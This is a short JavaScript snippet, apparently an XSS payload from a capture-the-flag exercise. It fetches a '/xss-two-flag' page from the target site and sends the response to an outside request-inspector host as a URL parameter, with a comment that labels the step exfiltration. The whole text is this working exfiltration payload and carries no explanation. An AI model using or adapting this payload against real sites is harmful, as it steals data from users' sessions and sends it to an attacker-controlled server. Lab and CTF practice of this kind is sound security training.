fetch('/xss-two-flag')
  .then(r => r.text())
  .then(flag => {
      // Exfiltrate to HTTP Request Inspector
      fetch('https://01km6z71vd9qasxg8qxnyp9fqk00-55d2282f5d0bffdeadb8.requestinspector.com?flag=' + encodeURIComponent(flag));
  });
